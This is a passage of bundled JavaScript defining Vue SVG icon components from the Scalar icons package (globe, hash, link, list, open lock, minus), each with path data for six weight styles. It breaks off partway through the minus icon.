var _hoisted_6$29 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconGlobeSimple.js
var ScalarIconGlobeSimple_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconGlobeSimple",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$118, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M128,20A108,108,0,1,0,236,128,108.12,108.12,0,0,0,128,20Zm83.13,96H179.56a144.3,144.3,0,0,0-21.35-66.36A84.22,84.22,0,0,1,211.13,116ZM128,207c-9.36-10.81-24.46-33.13-27.45-67h54.94a119.74,119.74,0,0,1-17.11,52.77A108.61,108.61,0,0,1,128,207Zm-27.45-91a119.74,119.74,0,0,1,17.11-52.77A108.61,108.61,0,0,1,128,49c9.36,10.81,24.46,33.13,27.45,67ZM97.79,49.64A144.3,144.3,0,0,0,76.44,116H44.87A84.22,84.22,0,0,1,97.79,49.64ZM44.87,140H76.44a144.3,144.3,0,0,0,21.35,66.36A84.22,84.22,0,0,1,44.87,140Zm113.34,66.36A144.3,144.3,0,0,0,179.56,140h31.57A84.22,84.22,0,0,1,158.21,206.36Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$80, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M224,128a96,96,0,1,1-96-96A96,96,0,0,1,224,128Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M128,24h0A104,104,0,1,0,232,128,104.12,104.12,0,0,0,128,24Zm87.62,96H175.79C174,83.49,159.94,57.67,148.41,42.4A88.19,88.19,0,0,1,215.63,120ZM96.23,136h63.54c-2.31,41.61-22.23,67.11-31.77,77C118.45,203.1,98.54,177.6,96.23,136Zm0-16C98.54,78.39,118.46,52.89,128,43c9.55,9.93,29.46,35.43,31.77,77Zm11.36-77.6C96.06,57.67,82,83.49,80.21,120H40.37A88.19,88.19,0,0,1,107.59,42.4ZM40.37,136H80.21c1.82,36.51,15.85,62.33,27.38,77.6A88.19,88.19,0,0,1,40.37,136Zm108,77.6c11.53-15.27,25.56-41.09,27.38-77.6h39.84A88.19,88.19,0,0,1,148.41,213.6Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$61, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M128,24h0A104,104,0,1,0,232,128,104.12,104.12,0,0,0,128,24Zm87.62,96H175.79C174,83.49,159.94,57.67,148.41,42.4A88.19,88.19,0,0,1,215.63,120ZM96.23,136h63.54c-2.31,41.61-22.23,67.11-31.77,77C118.45,203.1,98.54,177.6,96.23,136Zm0-16C98.54,78.39,118.46,52.89,128,43c9.55,9.93,29.46,35.43,31.77,77Zm52.18,93.6c11.53-15.27,25.56-41.09,27.38-77.6h39.84A88.19,88.19,0,0,1,148.41,213.6Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$44, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M128,26A102,102,0,1,0,230,128,102.12,102.12,0,0,0,128,26Zm89.8,96H173.89c-1.54-40.77-18.48-68.23-30.43-82.67A90.19,90.19,0,0,1,217.8,122ZM128,215.83a110,110,0,0,1-15.19-19.45A128.37,128.37,0,0,1,94.13,134h67.74a128.37,128.37,0,0,1-18.68,62.38A110,110,0,0,1,128,215.83ZM94.13,122a128.37,128.37,0,0,1,18.68-62.38A110,110,0,0,1,128,40.17a110,110,0,0,1,15.19,19.45A128.37,128.37,0,0,1,161.87,122Zm18.41-82.67c-12,14.44-28.89,41.9-30.43,82.67H38.2A90.19,90.19,0,0,1,112.54,39.33ZM38.2,134H82.11c1.54,40.77,18.48,68.23,30.43,82.67A90.19,90.19,0,0,1,38.2,134Zm105.26,82.67c11.95-14.44,28.89-41.9,30.43-82.67H217.8A90.19,90.19,0,0,1,143.46,216.67Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$34, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M128,24h0A104,104,0,1,0,232,128,104.12,104.12,0,0,0,128,24Zm87.62,96H175.79C174,83.49,159.94,57.67,148.41,42.4A88.19,88.19,0,0,1,215.63,120ZM96.23,136h63.54c-2.31,41.61-22.23,67.11-31.77,77C118.45,203.1,98.54,177.6,96.23,136Zm0-16C98.54,78.39,118.46,52.89,128,43c9.55,9.93,29.46,35.43,31.77,77Zm11.36-77.6C96.06,57.67,82,83.49,80.21,120H40.37A88.19,88.19,0,0,1,107.59,42.4ZM40.37,136H80.21c1.82,36.51,15.85,62.33,27.38,77.6A88.19,88.19,0,0,1,40.37,136Zm108,77.6c11.53-15.27,25.56-41.09,27.38-77.6h39.84A88.19,88.19,0,0,1,148.41,213.6Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$29, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M128,28h0A100,100,0,1,0,228,128,100.11,100.11,0,0,0,128,28Zm91.9,96h-48c-1.15-45.55-21.74-74.52-33.48-87.4A92.14,92.14,0,0,1,219.91,124ZM128,218.61c-8.32-8-34.57-37.13-35.93-86.61h71.86C162.57,181.48,136.32,210.61,128,218.61ZM92.07,124C93.43,74.52,119.68,45.39,128,37.39c8.32,8,34.57,37.13,35.93,86.61Zm25.47-87.4C105.8,49.48,85.21,78.45,84.06,124h-48A92.14,92.14,0,0,1,117.54,36.6ZM36.09,132h48c1.15,45.55,21.74,74.52,33.48,87.4A92.14,92.14,0,0,1,36.09,132Zm102.37,87.4c11.74-12.88,32.33-41.85,33.48-87.4h48A92.14,92.14,0,0,1,138.46,219.4Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconHash.vue.script.js
var _hoisted_1$117 = { key: 0 };
var _hoisted_2$79 = { key: 1 };
var _hoisted_3$60 = { key: 2 };
var _hoisted_4$43 = { key: 3 };
var _hoisted_5$33 = { key: 4 };
var _hoisted_6$28 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconHash.js
var ScalarIconHash_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconHash",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$117, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M224,84H180.2l7.61-41.85a12,12,0,0,0-23.62-4.3L155.8,84H116.2l7.61-41.85a12,12,0,1,0-23.62-4.3L91.8,84H48a12,12,0,0,0,0,24H87.44l-7.27,40H32a12,12,0,0,0,0,24H75.8l-7.61,41.85a12,12,0,0,0,9.66,14A11.43,11.43,0,0,0,80,228a12,12,0,0,0,11.8-9.86L100.2,172h39.6l-7.61,41.85a12,12,0,0,0,9.66,14,11.43,11.43,0,0,0,2.16.2,12,12,0,0,0,11.8-9.86L164.2,172H208a12,12,0,0,0,0-24H168.56l7.27-40H224a12,12,0,0,0,0-24Zm-79.83,64H104.56l7.27-40h39.61Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$79, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M165.82,96l-11.64,64h-64l11.64-64Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M224,88H175.4l8.47-46.57a8,8,0,0,0-15.74-2.86l-9,49.43H111.4l8.47-46.57a8,8,0,0,0-15.74-2.86L95.14,88H48a8,8,0,0,0,0,16H92.23L83.5,152H32a8,8,0,0,0,0,16H80.6l-8.47,46.57a8,8,0,0,0,6.44,9.3A7.79,7.79,0,0,0,80,224a8,8,0,0,0,7.86-6.57l9-49.43H144.6l-8.47,46.57a8,8,0,0,0,6.44,9.3A7.79,7.79,0,0,0,144,224a8,8,0,0,0,7.86-6.57l9-49.43H208a8,8,0,0,0,0-16H163.77l8.73-48H224a8,8,0,0,0,0-16Zm-76.5,64H99.77l8.73-48h47.73Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$60, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M116.25,112h31.5l-8,32h-31.5ZM224,48V208a16,16,0,0,1-16,16H48a16,16,0,0,1-16-16V48A16,16,0,0,1,48,32H208A16,16,0,0,1,224,48Zm-16,56a8,8,0,0,0-8-8H168.25l7.51-30.06a8,8,0,0,0-15.52-3.88L151.75,96h-31.5l7.51-30.06a8,8,0,0,0-15.52-3.88L103.75,96H64a8,8,0,0,0,0,16H99.75l-8,32H56a8,8,0,0,0,0,16H87.75l-7.51,30.06a8,8,0,0,0,5.82,9.7,8.13,8.13,0,0,0,2,.24,8,8,0,0,0,7.75-6.06L104.25,160h31.5l-7.51,30.06a8,8,0,0,0,5.82,9.7A8.13,8.13,0,0,0,136,200a8,8,0,0,0,7.75-6.06L152.25,160H192a8,8,0,0,0,0-16H156.25l8-32H200A8,8,0,0,0,208,104Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$43, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M224,90H173l8.89-48.93a6,6,0,1,0-11.8-2.14L160.81,90H109l8.89-48.93a6,6,0,0,0-11.8-2.14L96.81,90H48a6,6,0,0,0,0,12H94.63l-9.46,52H32a6,6,0,0,0,0,12H83L74.1,214.93a6,6,0,0,0,4.83,7A5.64,5.64,0,0,0,80,222a6,6,0,0,0,5.89-4.93L95.19,166H147l-8.89,48.93a6,6,0,0,0,4.83,7,5.64,5.64,0,0,0,1.08.1,6,6,0,0,0,5.89-4.93L159.19,166H208a6,6,0,0,0,0-12H161.37l9.46-52H224a6,6,0,0,0,0-12Zm-74.83,64H97.37l9.46-52h51.8Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$33, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M224,88H175.4l8.47-46.57a8,8,0,0,0-15.74-2.86l-9,49.43H111.4l8.47-46.57a8,8,0,0,0-15.74-2.86L95.14,88H48a8,8,0,0,0,0,16H92.23L83.5,152H32a8,8,0,0,0,0,16H80.6l-8.47,46.57a8,8,0,0,0,6.44,9.3A7.79,7.79,0,0,0,80,224a8,8,0,0,0,7.86-6.57l9-49.43H144.6l-8.47,46.57a8,8,0,0,0,6.44,9.3A7.79,7.79,0,0,0,144,224a8,8,0,0,0,7.86-6.57l9-49.43H208a8,8,0,0,0,0-16H163.77l8.73-48H224a8,8,0,0,0,0-16Zm-76.5,64H99.77l8.73-48h47.73Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$28, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M224,92H170.61l9.33-51.28a4,4,0,1,0-7.88-1.44L162.48,92H106.61l9.33-51.28a4,4,0,1,0-7.88-1.44L98.48,92H48a4,4,0,0,0,0,8H97L86.84,156H32a4,4,0,0,0,0,8H85.39l-9.33,51.28a4,4,0,0,0,3.22,4.65A3.65,3.65,0,0,0,80,220a4,4,0,0,0,3.94-3.29L93.52,164h55.87l-9.33,51.28a4,4,0,0,0,3.22,4.65,3.65,3.65,0,0,0,.72.07,4,4,0,0,0,3.94-3.29L157.52,164H208a4,4,0,0,0,0-8H159l10.19-56H224a4,4,0,0,0,0-8Zm-73.16,64H95l10.19-56H161Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconLink.vue.script.js
var _hoisted_1$116 = { key: 0 };
var _hoisted_2$78 = { key: 1 };
var _hoisted_3$59 = { key: 2 };
var _hoisted_4$42 = { key: 3 };
var _hoisted_5$32 = { key: 4 };
var _hoisted_6$27 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconLink.js
var ScalarIconLink_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconLink",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$116, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M117.18,188.74a12,12,0,0,1,0,17l-5.12,5.12A58.26,58.26,0,0,1,70.6,228h0A58.62,58.62,0,0,1,29.14,127.92L63.89,93.17a58.64,58.64,0,0,1,98.56,28.11,12,12,0,1,1-23.37,5.44,34.65,34.65,0,0,0-58.22-16.58L46.11,144.89A34.62,34.62,0,0,0,70.57,204h0a34.41,34.41,0,0,0,24.49-10.14l5.11-5.12A12,12,0,0,1,117.18,188.74ZM226.83,45.17a58.65,58.65,0,0,0-82.93,0l-5.11,5.11a12,12,0,0,0,17,17l5.12-5.12a34.63,34.63,0,1,1,49,49L175.1,145.86A34.39,34.39,0,0,1,150.61,156h0a34.63,34.63,0,0,1-33.69-26.72,12,12,0,0,0-23.38,5.44A58.64,58.64,0,0,0,150.56,180h.05a58.28,58.28,0,0,0,41.47-17.17l34.75-34.75a58.62,58.62,0,0,0,0-82.91Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$78, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M218.34,119.6,183.6,154.34a46.58,46.58,0,0,1-44.31,12.26c-.31.34-.62.67-.95,1L103.6,202.34A46.63,46.63,0,1,1,37.66,136.4L72.4,101.66A46.6,46.6,0,0,1,116.71,89.4c.31-.34.62-.67,1-1L152.4,53.66a46.63,46.63,0,0,1,65.94,65.94Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M240,88.23a54.43,54.43,0,0,1-16,37L189.25,160a54.27,54.27,0,0,1-38.63,16h-.05A54.63,54.63,0,0,1,96,119.84a8,8,0,0,1,16,.45A38.62,38.62,0,0,0,150.58,160h0a38.39,38.39,0,0,0,27.31-11.31l34.75-34.75a38.63,38.63,0,0,0-54.63-54.63l-11,11A8,8,0,0,1,135.7,59l11-11A54.65,54.65,0,0,1,224,48,54.86,54.86,0,0,1,240,88.23ZM109,185.66l-11,11A38.41,38.41,0,0,1,70.6,208h0a38.63,38.63,0,0,1-27.29-65.94L78,107.31A38.63,38.63,0,0,1,144,135.71a8,8,0,0,0,7.78,8.22H152a8,8,0,0,0,8-7.78A54.86,54.86,0,0,0,144,96a54.65,54.65,0,0,0-77.27,0L32,130.75A54.62,54.62,0,0,0,70.56,224h0a54.28,54.28,0,0,0,38.64-16l11-11A8,8,0,0,0,109,185.66Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$59, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M208,32H48A16,16,0,0,0,32,48V208a16,16,0,0,0,16,16H208a16,16,0,0,0,16-16V48A16,16,0,0,0,208,32ZM115.7,192.49a43.31,43.31,0,0,1-55-66.43l25.37-25.37a43.35,43.35,0,0,1,61.25,0,42.9,42.9,0,0,1,9.95,15.43,8,8,0,1,1-15,5.6A27.33,27.33,0,0,0,97.37,112L72,137.37a27.32,27.32,0,0,0,34.68,41.91,8,8,0,1,1,9,13.21Zm79.61-62.55-25.37,25.37A43,43,0,0,1,139.32,168h0a43.35,43.35,0,0,1-40.53-28.12,8,8,0,1,1,15-5.6A27.35,27.35,0,0,0,139.28,152h0a27.14,27.14,0,0,0,19.32-8L184,118.63a27.32,27.32,0,0,0-34.68-41.91,8,8,0,1,1-9-13.21,43.32,43.32,0,0,1,55,66.43Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$42, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M238,88.18a52.42,52.42,0,0,1-15.4,35.66l-34.75,34.75A52.28,52.28,0,0,1,150.62,174h-.05A52.63,52.63,0,0,1,98,119.9a6,6,0,0,1,6-5.84h.17a6,6,0,0,1,5.83,6.16A40.62,40.62,0,0,0,150.58,162h0a40.4,40.4,0,0,0,28.73-11.9l34.75-34.74A40.63,40.63,0,0,0,156.63,57.9l-11,11a6,6,0,0,1-8.49-8.49l11-11a52.62,52.62,0,0,1,74.43,0A52.83,52.83,0,0,1,238,88.18Zm-127.62,98.9-11,11A40.36,40.36,0,0,1,70.6,210h0a40.63,40.63,0,0,1-28.7-69.36L76.62,105.9A40.63,40.63,0,0,1,146,135.77a6,6,0,0,0,5.83,6.16H152a6,6,0,0,0,6-5.84A52.63,52.63,0,0,0,68.14,97.42L33.38,132.16A52.63,52.63,0,0,0,70.56,222h0a52.26,52.26,0,0,0,37.22-15.42l11-11a6,6,0,1,0-8.49-8.48Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$32, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M240,88.23a54.43,54.43,0,0,1-16,37L189.25,160a54.27,54.27,0,0,1-38.63,16h-.05A54.63,54.63,0,0,1,96,119.84a8,8,0,0,1,16,.45A38.62,38.62,0,0,0,150.58,160h0a38.39,38.39,0,0,0,27.31-11.31l34.75-34.75a38.63,38.63,0,0,0-54.63-54.63l-11,11A8,8,0,0,1,135.7,59l11-11A54.65,54.65,0,0,1,224,48,54.86,54.86,0,0,1,240,88.23ZM109,185.66l-11,11A38.41,38.41,0,0,1,70.6,208h0a38.63,38.63,0,0,1-27.29-65.94L78,107.31A38.63,38.63,0,0,1,144,135.71a8,8,0,0,0,16,.45A54.86,54.86,0,0,0,144,96a54.65,54.65,0,0,0-77.27,0L32,130.75A54.62,54.62,0,0,0,70.56,224h0a54.28,54.28,0,0,0,38.64-16l11-11A8,8,0,0,0,109,185.66Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$27, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M236,88.12a50.44,50.44,0,0,1-14.81,34.31l-34.75,34.74A50.33,50.33,0,0,1,150.62,172h-.05A50.63,50.63,0,0,1,100,120a4,4,0,0,1,4-3.89h.11a4,4,0,0,1,3.89,4.11A42.64,42.64,0,0,0,150.58,164h0a42.32,42.32,0,0,0,30.14-12.49l34.75-34.74a42.63,42.63,0,1,0-60.29-60.28l-11,11a4,4,0,0,1-5.66-5.65l11-11A50.64,50.64,0,0,1,236,88.12ZM111.78,188.49l-11,11A42.33,42.33,0,0,1,70.6,212h0a42.63,42.63,0,0,1-30.11-72.77l34.75-34.74A42.63,42.63,0,0,1,148,135.82a4,4,0,0,0,8,.23A50.64,50.64,0,0,0,69.55,98.83L34.8,133.57A50.63,50.63,0,0,0,70.56,220h0a50.33,50.33,0,0,0,35.81-14.83l11-11a4,4,0,1,0-5.65-5.66Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconList.vue.script.js
var _hoisted_1$115 = { key: 0 };
var _hoisted_2$77 = { key: 1 };
var _hoisted_3$58 = { key: 2 };
var _hoisted_4$41 = { key: 3 };
var _hoisted_5$31 = { key: 4 };
var _hoisted_6$26 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconList.js
var ScalarIconList_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconList",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$115, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M228,128a12,12,0,0,1-12,12H40a12,12,0,0,1,0-24H216A12,12,0,0,1,228,128ZM40,76H216a12,12,0,0,0,0-24H40a12,12,0,0,0,0,24ZM216,180H40a12,12,0,0,0,0,24H216a12,12,0,0,0,0-24Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$77, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M216,64V192H40V64Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$58, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M208,32H48A16,16,0,0,0,32,48V208a16,16,0,0,0,16,16H208a16,16,0,0,0,16-16V48A16,16,0,0,0,208,32ZM192,184H64a8,8,0,0,1,0-16H192a8,8,0,0,1,0,16Zm0-48H64a8,8,0,0,1,0-16H192a8,8,0,0,1,0,16Zm0-48H64a8,8,0,0,1,0-16H192a8,8,0,0,1,0,16Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$41, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M222,128a6,6,0,0,1-6,6H40a6,6,0,0,1,0-12H216A6,6,0,0,1,222,128ZM40,70H216a6,6,0,0,0,0-12H40a6,6,0,0,0,0,12ZM216,186H40a6,6,0,0,0,0,12H216a6,6,0,0,0,0-12Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$31, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$26, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M220,128a4,4,0,0,1-4,4H40a4,4,0,0,1,0-8H216A4,4,0,0,1,220,128ZM40,68H216a4,4,0,0,0,0-8H40a4,4,0,0,0,0,8ZM216,188H40a4,4,0,0,0,0,8H216a4,4,0,0,0,0-8Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconLockSimpleOpen.vue.script.js
var _hoisted_1$114 = { key: 0 };
var _hoisted_2$76 = { key: 1 };
var _hoisted_3$57 = { key: 2 };
var _hoisted_4$40 = { key: 3 };
var _hoisted_5$30 = { key: 4 };
var _hoisted_6$25 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconLockSimpleOpen.js
var ScalarIconLockSimpleOpen_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconLockSimpleOpen",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$114, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M208,76H100V56a28,28,0,0,1,28-28c13.51,0,25.65,9.62,28.24,22.39a12,12,0,1,0,23.52-4.78C174.87,21.5,153.1,4,128,4A52.06,52.06,0,0,0,76,56V76H48A20,20,0,0,0,28,96V208a20,20,0,0,0,20,20H208a20,20,0,0,0,20-20V96A20,20,0,0,0,208,76Zm-4,128H52V100H204Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$76, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M216,96V208a8,8,0,0,1-8,8H48a8,8,0,0,1-8-8V96a8,8,0,0,1,8-8H208A8,8,0,0,1,216,96Z",
				opacity: "0.2"
			}, null, -1), createBaseVNode("path", { d: "M208,80H96V56a32,32,0,0,1,32-32c15.37,0,29.2,11,32.16,25.59a8,8,0,0,0,15.68-3.18C171.32,24.15,151.2,8,128,8A48.05,48.05,0,0,0,80,56V80H48A16,16,0,0,0,32,96V208a16,16,0,0,0,16,16H208a16,16,0,0,0,16-16V96A16,16,0,0,0,208,80Zm0,128H48V96H208V208Z" }, null, -1)])])) : unref(weight) === "fill" ? (openBlock(), createElementBlock("g", _hoisted_3$57, [..._cache[2] || (_cache[2] = [createBaseVNode("path", { d: "M224,96V208a16,16,0,0,1-16,16H48a16,16,0,0,1-16-16V96A16,16,0,0,1,48,80H80V56A48.05,48.05,0,0,1,128,8c23.2,0,43.32,16.15,47.84,38.41a8,8,0,0,1-15.68,3.18C157.2,35,143.37,24,128,24A32,32,0,0,0,96,56V80H208A16,16,0,0,1,224,96Z" }, null, -1)])])) : unref(weight) === "light" ? (openBlock(), createElementBlock("g", _hoisted_4$40, [..._cache[3] || (_cache[3] = [createBaseVNode("path", { d: "M208,82H94V56a34,34,0,0,1,34-34c16.3,0,31,11.69,34.12,27.19a6,6,0,0,0,11.76-2.38C169.55,25.48,150.26,10,128,10A46.06,46.06,0,0,0,82,56V82H48A14,14,0,0,0,34,96V208a14,14,0,0,0,14,14H208a14,14,0,0,0,14-14V96A14,14,0,0,0,208,82Zm2,126a2,2,0,0,1-2,2H48a2,2,0,0,1-2-2V96a2,2,0,0,1,2-2H208a2,2,0,0,1,2,2Z" }, null, -1)])])) : unref(weight) === "regular" ? (openBlock(), createElementBlock("g", _hoisted_5$30, [..._cache[4] || (_cache[4] = [createBaseVNode("path", { d: "M208,80H96V56a32,32,0,0,1,32-32c15.37,0,29.2,11,32.16,25.59a8,8,0,0,0,15.68-3.18C171.32,24.15,151.2,8,128,8A48.05,48.05,0,0,0,80,56V80H48A16,16,0,0,0,32,96V208a16,16,0,0,0,16,16H208a16,16,0,0,0,16-16V96A16,16,0,0,0,208,80Zm0,128H48V96H208V208Z" }, null, -1)])])) : unref(weight) === "thin" ? (openBlock(), createElementBlock("g", _hoisted_6$25, [..._cache[5] || (_cache[5] = [createBaseVNode("path", { d: "M208,84H92V56a36,36,0,0,1,36-36c17.24,0,32.75,12.38,36.08,28.8a4,4,0,1,0,7.84-1.6C167.78,26.81,149.31,12,128,12A44.05,44.05,0,0,0,84,56V84H48A12,12,0,0,0,36,96V208a12,12,0,0,0,12,12H208a12,12,0,0,0,12-12V96A12,12,0,0,0,208,84Zm4,124a4,4,0,0,1-4,4H48a4,4,0,0,1-4-4V96a4,4,0,0,1,4-4H208a4,4,0,0,1,4,4Z" }, null, -1)])])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconMinus.vue.script.js
var _hoisted_1$113 = { key: 0 };
var _hoisted_2$75 = { key: 1 };
var _hoisted_3$56 = { key: 2 };
var _hoisted_4$39 = { key: 3 };
var _hoisted_5$29 = { key: 4 };
var _hoisted_6$24 = { key: 5 };
//#endregion
//#region node_modules/@scalar/icons/dist/components/ScalarIconMinus.js
var ScalarIconMinus_default = /* @__PURE__ */ defineComponent({
	name: "ScalarIconMinus",
	props: {
		label: {},
		weight: {}
	},
	setup(__props) {
		const { bind, weight } = useScalarIcon(__props);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("svg", mergeProps({
				xmlns: "http://www.w3.org/2000/svg",
				viewBox: "0 0 256 256",
				fill: "currentColor"
			}, unref(bind)), [renderSlot(_ctx.$slots, "default"), unref(weight) === "bold" ? (openBlock(), createElementBlock("g", _hoisted_1$113, [..._cache[0] || (_cache[0] = [createBaseVNode("path", { d: "M228,128a12,12,0,0,1-12,12H40a12,12,0,0,1,0-24H216A12,12,0,0,1,228,128Z" }, null, -1)])])) : unref(weight) === "duotone" ? (openBlock(), createElementBlock("g", _hoisted_2$75, [..._cache[1] || (_cache[1] = [createBaseVNode("path", {
				d: "M216,56V200a16,16,0,0,1-16,16H56a16,16,0,0,1-16-16V56A16,16,0,0,1,56,40H200A16,16,0,0,1,216,56Z",
				opacity: "0.2"
